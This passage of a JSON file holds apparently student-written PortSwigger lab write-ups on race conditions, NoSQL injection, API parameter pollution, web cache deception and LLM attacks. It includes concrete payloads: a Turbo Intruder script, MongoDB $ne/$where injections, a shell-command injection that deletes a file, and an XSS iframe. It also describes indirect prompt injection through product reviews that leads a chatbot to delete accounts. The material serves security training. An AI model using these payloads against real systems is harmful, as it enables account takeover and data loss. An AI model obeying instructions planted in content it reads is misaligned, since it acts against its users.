"PRACTITIONER", "title": "Time-sensitive vulnerability exploitation", "content": "I \ufb01rst tested the password reset feature on my own account. Each request returned a unique token, but the processing was sequential due to session locking. I created a second request using a fresh session (by removing the session cookie) to bypass the lock. When I sent the two POST /forgot-password requests in parallel, the response times sometimes matched, and I received two con\ufb01rmation emails with the same token. I then changed one of the requests to username=carlos and sent the pair in parallel again. Only one new email appeared in my inbox. I copied the link from my email, replaced the username in the query string with carlos, and visited it. The reset page loaded, and I set a new password for Carlos. I logged in as Carlos, accessed the admin panel, and deleted the user."}, {"num": "27.6", "difficulty": "EXPERT", "title": "Partial construction race condition", "content": "I used Burp to study the registration \ufb02ow. Only @ginandjuice.shop emails are allowed, but I found a JavaScript \ufb01le that leaks the con\ufb01rmation endpoint: /con\ufb01rm?token=. Testing different token values gave me a clue. Sending an empty token array with token[]= returned an \"Invalid token: Array\" error instead of \"Forbidden\", suggesting a race window where an uninitialized token could be valid I add some random strings to a /con\ufb01rm token endpoint and the screen pops up \u201cPlease click the button below\u201d. I send it to the repeater and test it out. Using not token results a 400 Bad request: def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2) con\ufb01rmationReq = '''POST /con\ufb01rm?token[]= HTTP/2 Host: 0a7900d7030ea82783be1045008b000b.web-security-academy.net Cookie: phpsessionid=Hlebf1ASGqza6iCFHVDobDNbFVv44fS6 Content-Length: 0 ''' for attempt in range(20): currentAttempt = str(attempt) username = 'User' + currentAttempt # Queue a single registration request engine.queue(target.req, username, gate=currentAttempt) # Queue 50 con\ufb01rmation requests - note that this may be sent in two separate packets for i in range(50): engine.queue(con\ufb01rmationReq, gate=currentAttempt) # Send all queued requests for this attempt engine.openGate(currentAttempt) def handleResponse(req, interesting): table.add(req) I sent registration and con\ufb01rmation requests in parallel using Turbo Intruder. The con\ufb01rmation response was always much faster, so I needed to delay it to hit the window. I scripted it: queue a single registration with a new username each attempt, then queue 50 con\ufb01rmation requests with token[]=, and open the gate for all at once. After running, I saw a 200 response con\ufb01rming a successful registration. I logged in with that username and the static password, then deleted carlos to solve the lab. The vulnerability is a race condition between storing the registration token and the con\ufb01rmation check."}]}, {"num": "28", "title": "NoSQL Injection", "labs": [{"num": "28.2", "difficulty": "APPRENTICE", "title": "Operator injection authentication bypass", "content": "I captured the POST login request in Burp Proxy and sent it to Repeater for testing. By changing the username parameter to {\"$ne\":\"\"} (which means \"not equal to empty string\"), I was able to bypass authentication and log in. This works because the query now asks the database for any user where the username is not empty - which always returns a match. I also tested using a regex pattern: {\"$regex\":\"wien.*\"}. This also worked, matching any username starting with \"wien\" (like my own credentials). Next, I tried applying {\"$ne\":\"\"} to both the username and password \ufb01elds. However, this resulted in an Internal Server Error - likely because the logic became ambiguous or the database couldn't process two such operators together. I then modi\ufb01ed the approach by setting the username to {\"$regex\":\"admin.*\"} while keeping the password as {\"$ne\":\"\"}. This time, I successfully logged in as the admin user! To con\ufb01rm, I sent a GET request to a restricted URL in Repeater and veri\ufb01ed that I was indeed authenticated as an administrator. I try to copy the URL so just check it out on my browser but it didn't works but you can try it. By injecting MongoDB operators like {\"$ne\":\"\"} (not equal to empty) and {\"$regex\":\"admin.*\"}, an attacker can manipulate database queries to log in as any user without knowing their password. The application \ufb02aw was it accepts use input and directly inserts into database queries without proper validation."}, {"num": "28.3", "difficulty": "PRACTITIONER", "title": "Data extraction via NoSQL injection", "content": "The application has a user lookup feature that's vulnerable to NoSQL injection. When I input special characters like apostrophes, the application returns errors, showing it doesn't properly \ufb01lter user input. More importantly, I discovered I could inject JavaScript conditions directly into the query. I found that by injecting boolean conditions like ' && '1'=='1, I could control the response. When the condition was true, I got user details. When false or this 1==2 condition, I got \"Could not \ufb01nd user.\" This gave me a way to ask yes/no questions to the database. Using this, I extracted the administrator's password character by character. I tested conditions like administrator' && this.password.length < 30 to \ufb01nd the password length (8 characters). Then I used Burp Intruder to brute-force each position by testing this.password[0]=='a', this.password[0]=='b', etc., until I found the correct character for each position. The vulnerability exists because the application evaluates user-supplied JavaScript conditions directly in database queries without sanitization. This allowed me to extract sensitive data by asking boolean questions and observing the responses, essentially turning the application into a oracle that revealed the password one character at a time."}, {"num": "28.4", "difficulty": "PRACTITIONER", "title": "Extracting unknown \ufb01elds", "content": "I started by logging in as carlos with a wrong password, which gave me an \"Invalid username or password\" message. In Burp Repeater, I changed the password value to {\"$ne\":\"invalid\"}. The $ne operator in MongoDB means \"not equal\", so this payload makes the query ask for any password that is not \"invalid\", effectively bypassing the password check. When I sent it, I received an \"Account locked\" response, con\ufb01rming that the operator was accepted and the application is vulnerable to NoSQL injection. I then tested whether I could inject JavaScript by adding a $where clause to the JSON. The $where operator allows executing arbitrary JavaScript code as part of the query. When I set it to \"$where\": \"0\", which evaluates to false, I got the invalid username message. Changing it to \"$where\": \"1\", which evaluates to true, gave me \"Account locked\" again. This proved that my JavaScript was being executed on the server, opening the door for more advanced injection. To \ufb01nd hidden \ufb01elds in the database, I sent the request to Burp Intruder and set up a cluster bomb attack. A cluster bomb iterates over two payload sets independently, combining every possible pair. I used the payload \"$where\": \"Object.keys(this)[1].match('^.{\u00a7\u00a7}\u00a7\u00a7.*')\". Here Object.keys(this) returns an array of \ufb01eld names in the current user document; the index [1] refers to the second \ufb01eld (since arrays start at 0). [0] [1] [2] The match function checks if the \ufb01eld name matches a regular expression that starts with a certain character at a certain position. By brute\u2011forcing the position and character, I could reconstruct the \ufb01eld name one letter at a time. Sorting the results by payload position and response length, I looked for responses containing \"Account locked\" (indicating a correct guess) and they spelled out the \ufb01eld name username. I found the endpoint and to verify, I sent a GET request to /forgot-password?resetPwdToken=invalid in Burp Repeater. The \"Invalid token\" message con\ufb01rmed that both the \ufb01eld name and the endpoint were correct. I returned to Intruder and updated the payload to \"$where\": \"this.resetPwdToken.match('^.{\u00a7\u00a7}\u00a7\u00a7.*')\". Now I was targeting the actual token value instead of the \ufb01eld name. Running another cluster bomb attack extracted the full token character by character. For each position, the correct character produced an \"Account locked\" response, while incorrect guesses gave \"Invalid username\". By noting the correct characters, I assembled the complete token. I visit the https://0a20002903cd942b802f188100f5000f.web-security-academy.net/forgot-password?resetP wdToken=2a4bdcbffa0ffb2f . The vulnerability here is NoSQL operator injection, speci\ufb01cally the ability to inject JavaScript through the $where clause. This allowed me to execute arbitrary code on the server, extract hidden \ufb01elds like password reset tokens, and ultimately take over another user's account."}]}, {"num": "29", "title": "API Testing", "labs": [{"num": "29.2", "difficulty": "PRACTITIONER", "title": "Server-side parameter pollution in query string", "content": "First, i try to click forgot password with the username of the admin. When i send the POST request to the repeater, i change the username to invalid username/don\u2019t exist. It gives me back the 400 request error. Then third testing is to truncate the server-side query string using this #. Send this POST request to the intruder and imitate this command: Let\u2019s change the x into email. I then proceed go back to the repeater and change it the \ufb01eld parameter to reset-token. Using this command username=administrator%26\ufb01eld=reset_token%23, i now get the reset token and then i put it on my webapplication (add it to the url) /forgot-password?reset_token=123456789. Then i proceed to the new tab for changing the password and i delete user Carlos."}, {"num": "29.3", "difficulty": "PRACTITIONER", "title": "Unused endpoint exploitation", "content": "The application exposes an API endpoint /api/products/{id}/price that accepts GET and PATCH methods. The PATCH method lacks proper authorization checks, allowing authenticated users to modify product prices. Attack surface is the API endpoint and the PATCH method used to update price values. I discovered the endpoint /api/products/3/price and sent an OPTIONS request to identify allowed methods. The response indicated GET and PATCH are permitted. I attempted a PATCH request but received an Unauthorized message. I logged in as wiener and navigated to the leather jacket product. I captured the GET request for that product and sent it to Repeater. I changed the method to PATCH, added Content-Type: application/json, and included a JSON body with {\"price\":0}. The request succeeded and updated the price to zero. I added the jacket to my cart and purchased it, solving the lab. The vulnerability exists because the PATCH method on the price endpoint was not properly protected. Although the endpoint was not used by the front end, it remained accessible and allowed price manipulation."}, {"num": "29.4", "difficulty": "PRACTITIONER", "title": "Mass assignment exploitation", "content": "The checkout functionality exposes an API endpoint that returns a JSON structure containing a chosen_discount parameter. The application uses this same structure in a POST request to process checkout, allowing mass assignment of properties. Attack surface is the /api/checkout endpoint and the JSON body parameters that control pricing. I logged in as wiener and added the leather jacket to my cart. I intercepted the GET request to /api/checkout and sent it to Repeater. The response contained a JSON object with a chosen_discount \ufb01eld showing a percentage value. I changed the method from GET to POST and included the same JSON structure in the request body, setting chosen_discount.percentage to 100. The server accepted the request and applied the full discount. I then completed the checkout process and purchased the jacket for free, solving the lab. { \"chosen_discount\": { \"percentage\": 100 }, \"chosen_products\": [ { \"product_id\": \"1\", \"quantity\": 1 } ] } The vulnerability exists because the server binds the entire JSON body to internal objects without \ufb01ltering which properties can be modi\ufb01ed. The chosen_discount parameter should not be writable by the client."}, {"num": "29.5", "difficulty": "EXPERT", "title": "REST URL parameter pollution", "content": "I triggered a password reset for the administrator and captured the POST /forgot-password request. Testing the username parameter with URL encoded administrator%23 returned an \"Invalid route\" error, suggesting the input is placed in a path and the fragment truncated something. Similarly, administrator%3F also gave an invalid route, indicating the question mark cuts off the path. I tried ./administrator and got a normal response, con\ufb01rming the input sits in the path. Using ../administrator gave invalid route, hinting I could traverse up. I added multiple ../ sequences until ../../../../%23 returned \"Not found\", meaning I left the API root. I then guessed common API de\ufb01nition \ufb01les and found openapi.json in the error message, which revealed an internal endpoint: /api/internal/v1/users/{username}/\ufb01eld/{\ufb01eld}. Using this structure, I injected administrator/\ufb01eld/email%23 and got a normal response, showing email is a valid \ufb01eld. From the JavaScript \ufb01le, I saw the password reset token parameter is passwordResetToken. I tried administrator/\ufb01eld/passwordResetToken%23 but got an error about API version. I adjusted the path to include the version: ../../v1/users/administrator/\ufb01eld/passwordResetToken%23 and the response returned a reset token. I used that token in the /forgot-password endpoint to set a new password for administrator, logged in, and deleted carlos to solve the lab. The vulnerability is server-side parameter pollution where user input is directly concatenated into a backend API URL. Attackers can inject path traversal and additional parameters to access unintended endpoints."}]}, {"num": "30", "title": "Web LLM Attacks", "labs": [{"num": "30.2", "difficulty": "PRACTITIONER", "title": "LLM API vulnerability exploitation", "content": "I asked the LLM about accessible APIs and learned about the Newsletter Subscription function, then requested it send a test email to my exploit server to con\ufb01rm API access. I injected $(whoami) into the email address and the resulting email was sent to carlos@exploit-server, con\ufb01rming command execution. Finally I injected $(rm /home/carlos/morale.txt) and the server executed the command, deleting the \ufb01le and solving the lab."}, {"num": "30.3", "difficulty": "PRACTITIONER", "title": "Indirect prompt injection", "content": "I asked the LLM about accessible APIs and learned it can delete accounts and edit emails. I registered an account and con\ufb01rmed the Edit Email API worked, implying Delete would too. I noticed the LLM includes product review content in its responses. I posted a review on the umbrella claiming it was out of stock, and when I asked about the umbrella again the LLM repeated that information, con\ufb01rming indirect prompt injection worked. I then posted a review containing a hidden prompt telling the LLM to delete the logged in user's account. When I asked about the umbrella, the LLM deleted my account. I created a new account, posted the same hidden prompt on the leather jacket product that carlos frequently asks about, and waited. When carlos queried the leather jacket, the LLM deleted his account, solving the lab.The vulnerability exists because the LLM trusts user generated content like product reviews and executes instructions hidden within them."}, {"num": "30.4", "difficulty": "EXPERT", "title": "Insecure output handling exploitation", "content": "The live chat uses an LLM that handles output insecurely, making it vulnerable to XSS when responses contain unsanitized content. The LLM reads product reviews and includes them in responses, creating an indirect prompt injection vector. Carlos frequently asks about the leather jacket. Attack surface is product reviews where payloads can be hidden and the chat interface where they execute. I registered an account and tested the chat with an XSS payload, con\ufb01rming the vulnerability. The LLM also supports a product_info function that reads reviews. I posted a review containing <iframe src=my-account onload=this.contentDocument.forms[1].submit()> but the LLM detected and ignored it. I crafted a stealthier review embedding the payload in natural language, and when I asked about that product the LLM included the iframe in its response, which deleted my account. I posted the same hidden payload on the leather jacket product and waited for carlos to ask about it. When he did, the LLM executed the payload and deleted his account, solving the lab. The vulnerability exists because the LLM output is not sanitized before being rendered in the chat, allowing XSS when reviews contain malicious content."}]}, {"num": "31", "title": "Web Cache Deception", "labs": [{"num": "31.2", "difficulty": "PRACTITIONER", "title": "Path delimiter exploitation", "content": "Use the own credentials to log-in and when i try to test the URL ,which i add random strings \u201casds\u201d the response of the application is 404 not found. Send that request to the intruder and let\u2019s bruteforce using Sniper attack. Select and add the payload position after the word my account. Use a delimiter characters here then Uncheck the URL encode of the characters and proceed to attack. We received a 200 response to the request. In Burp's browser, navigate to the exploit server and deliver the payload that caches Carlos's account details after the account receives the cached response."}, {"num": "31.3", "difficulty": "PRACTITIONER", "title": "Origin server normalization abuse", "content": "First lets log-in using our own credentials wiener and then we can see at the dashboard our own API key. Let\u2019s investigate the normalization discrepancies, using the GET /my-account request and try to add random strings. Use the delimiter payload and start attack. We got an 200 response to ? and As ? is generally universally used as a path delimiter, move on to investigate normalization discrepancies. Try to test this request /aaa/..%2fmy-account ,This means the origin decodes %2f to / and resolves effectively treating the path as /my-account. The origin normalizes the path. As we observed more the static resources under /resources are cached by looking at X-Cache : hit headers."}, {"num": "31.4", "difficulty": "PRACTITIONER", "title": "Cache server normalization abuse", "content": "After logging in as wiener, I saw my API key on the /my-account page and knew that was my target. I \ufb01rst tested how the origin server handled special characters. Using Burp Intruder, I found that the # character and its encoded version %23 acted as delimiters. When I added these to the URL, the origin server ignored everything after them and still returned my API key. The browser however uses # for fragments, so I needed the encoded %23 version. I then tested how the cache server handled paths. The cache had rules for the /resources directory and normalized URLs by decoding percent encoded characters and resolving dot segments like ..%2f. When I requested something like /aaa/..%2fresources, the cache normalized it to /resources and cached the response. I combined these observations into an exploit. I crafted a URL that looked like /my account%23%2f%2e%2e%2fresources. The cache normalized this path by decoding %23 to # and resolving ..%2f to ../, resulting in /my account#../resources. It saw the /resources directory, applied its caching rule, and stored the response. But the origin server saw %23 as a delimiter, ignored everything after it, processed the request as /my account, and returned the API key. When I delivered this URL to Carlos, his browser made the request, the cache stored his API key, and I could retrieve it by visiting the same cached URL myself. The vulnerability is when the cache and origin server had different normalization rules, allowing a sensitive page to be cached unintentionally."}, {"num": "31.5", "difficulty": "EXPERT", "title": "Exact-match cache rule exploitation", "content": "I \ufb01rst logged in as wiener and saw that the account page (/my-account) contained a CSRF token in the email\u2011change form. I tested how the origin server handles paths and found that a semicolon ; acts as a delimiter anything after it is ignored, so /my-account;anything still returns the account page. Send the request to Intruder. Then only 2 parameters have the response of successful ok.(? And ;) I combined these behaviors. I crafted a request to /my-account;%2f%2e%2e%2frobots.txt. The origin server saw the semicolon and processed the request as /my-account, returning my account page. I then built a CSRF attack page that submitted the email\u2011 change form using the stolen token and a new email address. I delivered that page to the administrator, and their email was changed. I get the administrator csrf and i paste in a new POST /change?email request DEFINITION OF THE EACH CATEGORIES : 1. SQL Injection (SQLi) - Tricking a website\u2019s database into revealing or changing data it shouldn\u2019t by putting malicious code in input \ufb01elds. 2. Authentication - Breaking the login process: bypassing password checks, guessing credentials, or taking over someone else\u2019s account. 3. Path Traversal - Making a web server give you \ufb01les it should keep private, like passwords or system settings, by escaping its folder restrictions."}]}];
